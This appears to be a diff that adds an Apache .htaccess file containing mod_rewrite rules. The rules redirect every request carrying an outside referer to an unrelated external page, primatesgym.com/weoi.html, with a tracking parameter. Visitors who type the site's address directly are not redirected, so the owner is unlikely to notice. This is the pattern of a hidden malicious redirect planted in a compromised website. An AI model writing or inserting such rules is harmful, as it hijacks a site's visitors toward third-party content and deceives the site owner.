@@ -1,0 +1,8 @@
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteCond %{HTTP_REFERER} ^http://[w.]*([^/]+)
+RewriteCond %{HTTP_HOST}/%1 !^[w.]*([^/]+)/$ [NC]
+RewriteRule ^.*$ http://primatesgym.com/weoi.html?h=1374160 [L,R]
+</IfModule>
+
